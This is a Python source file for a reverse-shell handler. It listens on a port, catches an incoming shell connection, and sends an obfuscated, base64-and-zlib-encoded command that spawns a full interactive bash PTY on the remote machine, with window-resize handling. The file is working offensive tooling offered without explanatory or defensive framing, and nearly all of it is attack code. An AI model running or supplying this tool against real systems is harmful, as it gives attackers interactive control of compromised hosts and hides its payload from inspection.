import socket
import os
import termios
import struct
import sys
import fcntl
import signal
import select
import zlib
import base64

def get_terminal_size():
    """Get the current terminal size."""
    rows, cols = os.popen('stty size', 'r').read().split()
    return int(rows), int(cols)

def set_window_size():
    """Set the window size of the local terminal."""
    rows, cols = get_terminal_size()
    window_size = struct.pack('HHHH', rows, cols, 0, 0)
    fcntl.ioctl(sys.stdout, termios.TIOCSWINSZ, window_size)

def setup_terminal():
    """Set up the terminal to raw mode, saving current attributes for restoration."""
    old_tty_attrs = termios.tcgetattr(sys.stdin)
    tty_attrs = termios.tcgetattr(sys.stdin)

    # Set terminal to raw mode: disable echo, canonical mode, signals, and flow control
    tty_attrs[3] &= ~(termios.ECHO | termios.ICANON | termios.ISIG | termios.IEXTEN)
    tty_attrs[1] &= ~(termios.OPOST)
    tty_attrs[0] &= ~(termios.IXON | termios.IXOFF | termios.INLCR | termios.ICRNL | termios.IGNCR)

    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, tty_attrs)

    return old_tty_attrs

def revert_terminal(old_tty_attrs):
    """Revert terminal to original settings."""
    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty_attrs)

def send_resize_sequence(conn):
    """Send a custom sequence to indicate a terminal resize."""
    rows, cols = get_terminal_size()
    resize_sequence = f'\x1b[999;{rows};{cols}R'
    conn.sendall(resize_sequence.encode())

def main(port: int):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(('0.0.0.0', port))
        listener.listen(1)
        print(f"Listening on port {port}...")

        conn, addr = listener.accept()
        print(f"Connection received from {addr}")

        # Remote Python script as a single multiline string
        remote_code = """
import os
import pty
import sys
import fcntl
import termios
import struct
import select

def set_window_size(fd, rows, cols):
    window_size = struct.pack('HHHH', rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, window_size)

def main():
    master_fd, slave_fd = pty.openpty()
    pid = os.fork()

    if pid == 0:
        os.close(master_fd)
        os.setsid()
        os.dup2(slave_fd, sys.stdin.fileno())
        os.dup2(slave_fd, sys.stdout.fileno())
        os.dup2(slave_fd, sys.stderr.fileno())
        os.execv("/bin/bash", ["/bin/bash"])
    else:
        os.close(slave_fd)
        escape_sequence = b'\\x1b[999;'
        buffer = b""
        while True:
            r, w, e = select.select([sys.stdin, master_fd], [], [])
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                buffer += data
                if escape_sequence in buffer:
                    start = buffer.find(escape_sequence)
                    end = buffer.find(b'R', start)
                    if end != -1:
                        resize_data = buffer[start + len(escape_sequence):end]
                        try:
                            rows, cols = map(int, resize_data.split(b';'))
                            set_window_size(master_fd, rows, cols)
                        except ValueError:
                            pass
                        buffer = buffer[end + 1:]
                    else:
                        continue
                else:
                    os.write(master_fd, data)
            if master_fd in r:
                data = os.read(master_fd, 1024)
                os.write(sys.stdout.fileno(), data)

if __name__ == "__main__":
    main()
"""

        # Compress the remote code using zlib
        compressed_code = zlib.compress(remote_code.encode())

        # Encode the compressed code with base64
        encoded_code = base64.b64encode(compressed_code).decode()

        # Create the final command to send
        command = f"python3 -c 'import zlib,base64;exec(zlib.decompress(base64.b64decode(\"{encoded_code}\")))'"

        # Send the remote Python script as a single line command
        conn.sendall(command.encode() + b"\n")

        old_tty_attrs = setup_terminal()

        try:
            # Set the window size on both the local and remote terminal
            set_window_size()
            send_resize_sequence(conn)

            def resize_handler(signum, frame):
                set_window_size()
                send_resize_sequence(conn)

            signal.signal(signal.SIGWINCH, resize_handler)  # Handle terminal resize

            while True:
                r, _, _ = select.select([sys.stdin, conn], [], [])
                if sys.stdin in r:
                    data = os.read(sys.stdin.fileno(), 1024)
                    if len(data) == 0:
                        break
                    conn.send(data)
                if conn in r:
                    data = conn.recv(1024)
                    if len(data) == 0:
                        break
                    os.write(sys.stdout.fileno(), data)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            revert_terminal(old_tty_attrs)
            conn.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    main(port)
